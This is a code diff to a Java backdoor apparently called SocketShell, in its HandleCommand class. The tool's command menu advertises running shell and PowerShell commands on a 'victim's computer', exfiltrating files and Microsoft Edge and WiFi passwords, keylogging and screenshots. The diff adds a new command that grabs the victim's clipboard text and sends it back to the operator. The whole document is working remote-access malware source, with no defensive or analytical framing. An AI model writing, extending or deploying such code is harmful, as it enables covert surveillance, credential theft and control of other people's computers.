@@ -1,5 +1,6 @@
 package com.github.thatcherdev.socketshell.backdoor;
 
+import java.awt.datatransfer.DataFlavor;
 import java.awt.Rectangle;
 import java.awt.Robot;
 import java.awt.Toolkit;
@@ -27,7 +28,7 @@ public class HandleCommand {
 			send = "[cmd] Run Command Prompt commands\n[ps] Run a PowerShell script\n[ds] Run a DuckyScript\n"
 					+ "[exfiles] Exfiltarte files based on extension\n[expass] Exfiltrate Microsoft Edge and WiFi passwords\n"
 					+ "[filesend] Send a file to victim's computer\n[filerec] Receive a file from victim's computer\n"
-					+ "[keylog] Start a KeyLogger on victim's computer\n[ss] Get screenshot of vitim's computer\n[exit] Exit";
+					+ "[keylog] Start a KeyLogger on victim's computer\n[ss] Get screenshot of vitim's computer\n[cb] Get text currently copied to victim's clipboard\n[exit] Exit";
 		else if (command.startsWith("cmd"))
 			send = Utils.runCommand(command.substring(4));
 		else if (command.startsWith("ps"))
@@ -87,6 +88,13 @@ public class HandleCommand {
 				send = "Screenshot received";
 			} catch (Exception e) {
 				send = "An error occurred when trying to receive screenshot";
+			}
+		else if (command.equals("cb"))
+			try {
+				String cb = (String) Toolkit.getDefaultToolkit().getSystemClipboard().getData(DataFlavor.stringFlavor);
+				send = "Victim's clipboard:\n" + cb;
+			} catch (Exception e) {
+				send = "An error occurred when trying to get victim's clipboard";
 			}
 		else if (!command.isEmpty())
 			send = "Command not found";
